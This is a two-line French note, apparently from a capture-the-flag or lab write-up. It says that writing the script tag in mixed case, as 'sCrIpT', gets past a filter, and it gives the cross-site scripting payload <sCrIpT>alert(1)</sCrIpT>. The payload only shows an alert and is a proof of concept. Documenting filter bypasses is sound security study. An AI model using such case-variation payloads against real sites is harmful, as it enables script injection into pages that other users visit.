En changeant les balises en `script` en: `sCrIpT` nous avons une xss:

payload:
```
<sCrIpT>alert(1)</sCrIpT>
```